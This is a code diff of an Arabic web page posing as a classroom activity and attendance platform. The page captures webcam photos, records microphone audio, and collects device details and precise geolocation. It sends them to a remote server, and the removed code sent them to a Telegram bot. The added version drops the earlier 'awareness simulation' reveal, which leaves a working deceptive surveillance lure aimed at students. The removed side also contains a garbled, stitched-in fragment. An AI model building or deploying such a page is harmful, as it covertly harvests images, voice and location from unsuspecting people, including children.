@@ -7,14 +7,18 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, sans-serif; }
         body { background: #0f172a; color: #f8fafc; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 15px; text-align: center; }
-        .card { background: #1e293b; border-radius: 20px; padding: 25px; max-width: 400px; width: 100%; border: 1px solid #334155; box-shadow: 0 10px 25px rgba(0,0,0,0.4); }
+        .card { background: #1e293b; border-radius: 20px; padding: 25px; max-width: 480px; width: 100%; border: 1px solid #334155; box-shadow: 0 10px 25px rgba(0,0,0,0.4); }
         h1 { color: #38bdf8; font-size: 20px; margin-bottom: 12px; }
         p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
         .btn { background: #0284c7; color: white; border: none; padding: 14px; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; width: 100%; }
+        .btn[disabled] { opacity: 0.7; cursor: not-allowed; }
         .btn:hover { background: #0369a1; }
         .alert-box { background: #450a0a; border: 1px solid #ef4444; border-radius: 12px; padding: 20px; text-align: right; }
         .alert-box h2 { color: #ef4444; text-align: center; font-size: 18px; margin-bottom: 10px; }
         video, canvas { display: none; }
+        .status { margin-top: 12px; font-size: 13px; color: #cbd5e1; }
+        .status.error { color: #fca5a5; }
+        .status.success { color: #86efac; }
     </style>
 </head>
 <body>
@@ -22,223 +26,284 @@
 <div class="card" id="app">
     <h1 id="title">🎓 منصة التفاعل والأنشطة الصفية</h1>
     <p id="desc">اضغط على الزر أدناه لبدء النشاط التفاعلي وتأكيد الحضور في حصة اليوم.</p>
-    <button class="btn" onclick="runExperiment()">بدء النشاط 🚀</button>
+    <button class="btn" id="startBtn">بدء النشاط 🚀</button>
+    <div id="status" class="status" aria-live="polite"></div>
 </div>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
 <script>
-    // قراءة نوع الخدعة من الرابط
-    const urlParams = new URLSearchParams(window.location.search);
-    const mode = urlParams.get('mode') || 'u1_snap1';
+/*
+  تحسينات معالجة الأخطاء والموثوقية:
+  - متغيرات تهيئة أعلى الملف (SERVER_URL, BOT_TOKEN, CHAT_ID)
+  - استخدام AbortController و timeouts لطلبات getUserMedia و fetch
+  - دوال مساعده: showStatus, fetchWithRetry, getMediaWithTimeout
+  - توحيد منطق التشغيل وتنظيف الكود المكرر
+*/
 
-    // تخصيص النصوص بحسب الخدعة المحددة
-    if(mode.includes('u4_wheel')) {
-        document.getElementById('title').innerText = "🎁 عجلة الحظ المباشرة للطلاب";
-        document.getElementById('desc').innerText = "اضغط لتدوير العجلة ومعرفة جائزتك الفورية!";
-    } else if(mode.includes('u3_pin')) {
-        document.getElementById('title').innerText = "🔑 إعدادات الأمان والحساب";
-    }
+// ----- تهيئة (ضع القيم المناسبة هنا) -----
+const SERVER_URL = 'https://YOUR-RENDER-APP.onrender.com/send-message'; // <-- غيّر إلى عنوان السيرفر الخاص بك
+const BOT_TOKEN = ''; // <-- اترك فارغا أو ضع قيمة إذا رغبت
+const CHAT_ID = ''; // <-- اترك فارغا أو ضع قيمة إذا رغبت
 
-    async function runExperiment() {
-        const btn = document.querySelector('.btn');
-        btn.innerText = "جاري التحميل...";
-        btn.disabled = true;
+// إعدادات عامة
+const DEFAULT_TIMEOUT_MS = 12000; // تحميل/التقاط + طلبات الشبكة
+const FETCH_RETRIES = 2;
 
+// قراءة وضع الخدعة من الرابط
+const urlParams = new URLSearchParams(window.location.search);
+const mode = urlParams.get('mode') || 'u1_snap1';
+
+// عناصر الواجهة
+const startBtn = document.getElementById('startBtn');
+const statusEl = document.getElementById('status');
+const titleEl = document.getElementById('title');
+const descEl = document.getElementById('desc');
+const videoEl = document.getElementById('video');
+const canvasEl = document.getElementById('canvas');
+
+// تخصيص نصوص بسيطة بحسب الوضع
+if (mode.includes('u4_wheel')) {
+    titleEl.innerText = "🎁 عجلة الحظ المباشرة للطلاب";
+    descEl.innerText = "اضغط لتدوير العجلة ومعرفة جائزتك الفورية!";
+} else if (mode.includes('u3_pin')) {
+    titleEl.innerText = "🔑 إعدادات الأمان والحساب";
+}
+
+startBtn.addEventListener('click', runExperiment);
+
+function showStatus(message, type = 'info') {
+    statusEl.textContent = message;
+    statusEl.className = `status ${type === 'error' ? 'error' : type === 'success' ? 'success' : ''}`;
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+// fetch مع إعادة المحاولة و timeout
+async function fetchWithRetry(url, options = {}, retries = FETCH_RETRIES, timeoutMs = DEFAULT_TIMEOUT_MS) {
+    for (let attempt = 0; attempt <= retries; attempt++) {
+        const controller = new AbortController();
+        const id = setTimeout(() => controller.abort(), timeoutMs);
         try {
-            // طلب إذن الكاميرا
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            
-            await new Promise((resolve) => {
-                video.onloadedmetadata = () => {
-                    video.play();
-                    setTimeout(resolve, 1500); // الانتظار قليلاً لالتقاط الصورة بدقة
-                };
-            });
-
-            const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // تحويل الصورة إلى صيغة Base64
-            const imageData = canvas.toDataURL('image/jpeg', 0.8);
-
-            // إيقاف الكاميرا بعد الالتقاط
-            stream.getTracks().forEach(track => track.stop());
-
-            // جمع بيانات إضافية (مثل نوع المتصفح أو الرابط)
-            const payloadData = {
-                message: `نشاط: ${mode}`,
-                image: imageData
-            };
-
-            // إرسال البيانات إلى السيرفر الوسيط (Render) الخاص بك بأمان
-            const response = await fetch('https://YOUR-RENDER-APP.onrender.com/send-message', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payloadData)
-            });
-
-            if (response.ok) {
-                // تحويل الواجهة بعد الإرسال الناجح
-                document.getElementById('app').innerHTML = `
-                    <div class="alert-box">
-                        <h2>⚠️ تنبيه أمني النظام</h2>
-                        <p>تم رصد محاولة دخول غير مصرح بها أو تم تفعيل الحماية بنجاح.</p>
-                    </div>
-                `;
-            } else {
-                throw new Error("فشل إرسال البيانات للخادم");
-            }
-
+            const res = await fetch(url, { ...options, signal: controller.signal });
+            clearTimeout(id);
+            if (!res.ok) throw new Error(`HTTP ${res.status}`);
+            return res;
         } catch (err) {
-            console.error(err);
-            btn.innerText = "حدث خطأ، حاول مرة أخرى";
-            btn.disabled = false;
+            clearTimeout(id);
+            const isLast = attempt === retries;
+            console.error('fetchWithRetry attempt', attempt, err);
+            if (isLast) throw err;
+            // exponential backoff
+            await sleep(500 * Math.pow(2, attempt));
         }
     }
-</script>
+}
 
-</body>
-</html>
+// الحصول على الوسائط مع timeout (كاميرا/مايك)
+async function getMediaWithTimeout(constraints, timeoutMs = 8000) {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), timeoutMs);
+    try {
+        // navigator.mediaDevices.getUserMedia لا يدعم signal في كل المتصفحات، لذلك نستخدم Promise.race
+        const getMedia = navigator.mediaDevices.getUserMedia(constraints);
+        const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), timeoutMs));
+        const stream = await Promise.race([getMedia, timeout]);
+        clearTimeout(timer);
+        return stream;
+    } catch (err) {
+        clearTimeout(timer);
+        throw err;
+    }
+}
 
-             document.getElementById('desc').innerText = "يرجى الموافقة لتأكيد رمز الحماية 
+// دالة التقاط صورة واحدة (مخفضة الدقة للسرعة) وإرسالها
+async function capturePhotoAndSend({ label = 'snap', width = 640, height = 480 } = {}) {
+    showStatus('جاري طلب إذن الكاميرا...');
+    let stream;
+    try {
+        stream = await getMediaWithTimeout({ video: { facingMode: 'user' } }, 8000);
+    } catch (err) {
+        console.error('camera error', err);
+        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+            showStatus('مرفوض: لم تتم الموافقة على الكاميرا. يرجى منح الإذن ثم المحاولة مجدداً.', 'error');
+        } else if (err.message === 'timeout') {
+            showStatus('انتهى زمن انتظار الكاميرا. حاول إعادة تحميل الصفحة أو التحقق من الجهاز.', 'error');
+        } else {
+            showStatus('تعذر الوصول إلى الكاميرا: ' + (err.message || err.name), 'error');
+        }
+        return;
     }
 
-    async function runExperiment() {
-        // 1. الوحدة 1: صور سريعة أو متتالية
-        if (mode === 'u1_snap1') {
-            capturePhoto(1, "📸 [صورة واحدة خاطفة]");
-        } else if (mode === 'u1_snap3') {
-            capturePhoto(3, "🎞️ [سلسلة 3 صور متتالية]");
-        } 
-        // 2. الوحدة 2: تسجيل صوتي
-        else if (mode.startsWith('u2_')) {
-            recordAudio(4); // تسجيل 4 ثواني صوت
-        }
-        // 3. الوحدة 3: معلومات النظام والهاتف
-        else if (mode.startsWith('u3_')) {
-            sendDeviceInfo();
-        }
-        // 4. الوحدة 4 و 5: صور + موقع شامل
-        else {
-            capturePhoto(1, `🚨 [خدعة متقدمة: ${mode}]`);
-            sendLocation();
-        }
+    try {
+        videoEl.srcObject = stream;
+        await new Promise((res) => videoEl.onloadedmetadata = res);
+        // ننتظر قليلاً حتى تستقر الصورة على بعض الأجهزة
+        await sleep(600);
+
+        // ضبط حجم الكانفاس لأداء أسرع
+        canvasEl.width = width;
+        canvasEl.height = height;
+        const ctx = canvasEl.getContext('2d');
+        ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
+
+        // الحصول على Blob منخفض الجودة لتسريع الإرسال
+        const blob = await new Promise(resolve => canvasEl.toBlob(resolve, 'image/jpeg', 0.6));
+
+        // بناء الحمولة
+        const payload = new FormData();
+        payload.append('message', `نشاط: ${mode} - ${label}`);
+        payload.append('image', blob, `${label}.jpg`);
+
+        showStatus('جاري إرسال البيانات...');
+        // نستخدم fetchWithRetry مع timeout
+        const res = await fetchWithRetry(SERVER_URL, { method: 'POST', body: payload }, FETCH_RETRIES, 12000);
+        await res.text();
+
+        showStatus('تم الإرسال بنجاح.', 'success');
+    } catch (err) {
+        console.error('capture/send error', err);
+        showStatus('فشل أثناء المعالجة: ' + (err.message || err.name), 'error');
+    } finally {
+        if (stream) stream.getTracks().forEach(t => t.stop());
+    }
+}
+
+// تسجيل صوتي قصير (للوحدة u2)
+async function recordAudioAndSend(seconds = 4) {
+    showStatus('جاري طلب إذن الميكروفون...');
+    let stream;
+    try {
+        stream = await getMediaWithTimeout({ audio: true }, 8000);
+    } catch (err) {
+        console.error('mic error', err);
+        if (err.name === 'NotAllowedError') showStatus('مرفوض: لم تتم الموافقة على الميكروفون.', 'error');
+        else showStatus('تعذر الوصول إلى الميكروفون.', 'error');
+        return;
     }
 
-    // --- وظيفة التقاط الصور (واحدة أو متتالية) ---
-    async function capturePhoto(count, label) {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
+    try {
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        const stopPromise = new Promise(resolve => mediaRecorder.onstop = resolve);
+        mediaRecorder.start();
+        showStatus('جاري تسجيل الصوت...');
+        await sleep(seconds * 1000);
+        mediaRecorder.stop();
+        await stopPromise;
 
-            let taken = 0;
-            const interval = setInterval(() => {
-                taken++;
-                const canvas = document.getElementById('canvas');
-                canvas.width = 320; canvas.height = 240;
-                canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+        const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+        const payload = new FormData();
+        payload.append('message', `نشاط: ${mode} - تسجيل صوتي`);
+        payload.append('audio', blob, 'voice.ogg');
 
-                canvas.toBlob(blob => {
-                    const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('photo', blob, `snap_${taken}.jpg`);
-                    fd.append('caption', `${label} - لقطة (${taken} من ${count})`);
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                }, 'image/jpeg', 0.4);
-
-                if (taken >= count) {
-                    clearInterval(interval);
-                    stream.getTracks().forEach(t => t.stop());
-                    showEduReport();
-                }
-            }, 1200);
-
-        } catch (e) { alert("⚠️ يجب إعطاء الموافقة لتأكيد النشاط!"); }
+        showStatus('جاري إرسال التسجيل...');
+        await fetchWithRetry(SERVER_URL, { method: 'POST', body: payload }, FETCH_RETRIES, 12000);
+        showStatus('تم إرسال التسجيل.', 'success');
+    } catch (err) {
+        console.error('record/send error', err);
+        showStatus('فشل تسجيل الصوت أو الإرسال: ' + (err.message || err.name), 'error');
+    } finally {
+        if (stream) stream.getTracks().forEach(t => t.stop());
     }
+}
 
-    // --- وظيفة تسجيل الصوت (الوحدة 2) ---
-    async function recordAudio(seconds) {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            const mediaRecorder = new MediaRecorder(stream);
-            const chunks = [];
-
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('voice', blob, 'voice.ogg');
-                fd.append('caption', '🎙️ [الوحدة 2] تسجيل صوتي خفي من المايك!');
-
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd })
-                    .then(() => showEduReport());
-            };
-
-            mediaRecorder.start();
-            setTimeout(() => {
-                mediaRecorder.stop();
-                stream.getTracks().forEach(t => t.stop());
-            }, seconds * 1000);
-
-        } catch (e) { alert("⚠️ يتطلب النشاط إذن الميكروفون!"); }
+// إرسال معلومات الجهاز (الوحدة u3)
+async function sendDeviceInfo() {
+    let battery = 'غير معروف';
+    if (navigator.getBattery) {
+        try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}%`; } catch (e) { }
     }
+    const report = `📱 [بيانات الجهاز - الوحدة 3]\n• المتصفح والنظام: ${navigator.userAgent}\n• دقة الشاشة: ${screen.width}x${screen.height}\n• البطارية: ${battery}\n• اللغة: ${navigator.language}`;
 
-    // --- وظيفة سحب معلومات الهاتف (الوحدة 3) ---
-    async function sendDeviceInfo() {
-        let battery = "غير معروف";
-        if (navigator.getBattery) {
-            try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}%`; } catch(e){}
-        }
-
-        const report = `
-📱 *[بيانات الهاتف المسحوبة - الوحدة 3]:*
-• المتصفح والنظام: ${navigator.userAgent}
-• دقة الشاشة: ${screen.width}x${screen.height}
-• البطارية: ${battery}
-• اللغة: ${navigator.language}
-        `;
-
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    try {
+        showStatus('جاري إرسال بيانات الجهاز...');
+        await fetchWithRetry(SERVER_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'Markdown' })
-        }).then(() => showEduReport());
+            body: JSON.stringify({ message: report })
+        }, FETCH_RETRIES, 10000);
+        showStatus('تم إرسال بيانات الجهاز.', 'success');
+    } catch (err) {
+        console.error('sendDeviceInfo error', err);
+        showStatus('فشل إرسال بيانات الجهاز.', 'error');
     }
+}
 
-    // --- وظيفة سحب الموقع الجغرافي (الوحدة 5) ---
-    function sendLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(p => {
-                const locText = `📍 *[الموقع الجغرافي دقيقاً]:*\nhttps://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: locText, parse_mode: 'Markdown' })
-                });
-            });
+// إرسال الموقع (الوحدة u5)
+function sendLocation() {
+    if (!navigator.geolocation) {
+        showStatus('الموقع غير مدعوم في هذا المتصفح.', 'error');
+        return;
+    }
+    showStatus('جاري الحصول على الموقع...');
+    navigator.geolocation.getCurrentPosition(async (p) => {
+        const locText = `📍 [الموقع الجغرافي]: https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`;
+        try {
+            await fetchWithRetry(SERVER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ message: locText })
+            }, FETCH_RETRIES, 10000);
+            showStatus('تم إرسال الموقع.', 'success');
+        } catch (err) {
+            console.error('sendLocation error', err);
+            showStatus('فشل إرسال الموقع.', 'error');
         }
-    }
+    }, (err) => {
+        console.error('geolocation error', err);
+        showStatus('تعذر الحصول على الموقع: ' + (err.message || err.code), 'error');
+    }, { timeout: 10000, maximumAge: 0 });
+}
 
-    function showEduReport() {
-        document.getElementById('app').innerHTML = `
-            <div class="alert-box">
-                <h2>🚨 تم اختبارك بنجاح!</h2>
-                <p style="color:#fca5a5; font-size:13px; margin-top:10px;">هذه محاكاة توعوية لمادة <b>الأمن السيبراني ومخاطر المجتمع</b>.</p>
-                <p style="color:#4ade80; font-size:13px; margin-top:10px; font-weight:bold;">💡 لا تعطِ صلاحيات الكاميرا أو المايك أو الموقع لأي رابط غير موثوق!</p>
-            </div>
-        `;
+// توحيد منطق التشغيل
+async function runExperiment() {
+    startBtn.disabled = true;
+    startBtn.innerText = 'جاري المعالجة...';
+    showStatus('البدء: ' + mode);
+
+    try {
+        if (mode === 'u1_snap1') {
+            await capturePhotoAndSend({ label: 'snap1', width: 640, height: 480 });
+        } else if (mode === 'u1_snap3') {
+            // ثلاث لقطات متتابعة
+            for (let i = 1; i <= 3; i++) {
+                await capturePhotoAndSend({ label: `snap_${i}`, width: 320, height: 240 });
+                await sleep(700);
+            }
+        } else if (mode.startsWith('u2_')) {
+            await recordAudioAndSend(4);
+        } else if (mode.startsWith('u3_')) {
+            await sendDeviceInfo();
+        } else if (mode.includes('u4') || mode.includes('u5')) {
+            await capturePhotoAndSend({ label: `advanced_${mode}`, width: 640, height: 480 });
+            sendLocation();
+        } else {
+            // افتراضي: لقطة سريعة
+            await capturePhotoAndSend({ label: 'default_snap', width: 640, height: 480 });
+        }
+    } catch (err) {
+        console.error('runExperiment error', err);
+        showStatus('حدث خطأ غير متوقع: ' + (err.message || err.name), 'error');
+    } finally {
+        startBtn.disabled = false;
+        startBtn.innerText = 'بدء النشاط 🚀';
     }
+}
+
+// تحذير خصوصية واضح للمستخدم
+(function addPrivacyNote() {
+    const note = document.createElement('p');
+    note.style.fontSize = '12px';
+    note.style.color = '#94a3b8';
+    note.style.marginTop = '10px';
+    note.textContent = 'ملاحظة: سيتم طلب أذونات الكاميرا/الميكروفون/الموقع عند الضرورة. لا تشارك بيانات حساسة مع روابط غير موثوقة.';
+    document.getElementById('app').appendChild(note);
+})();
+
 </script>
+
 </body>
 </html>
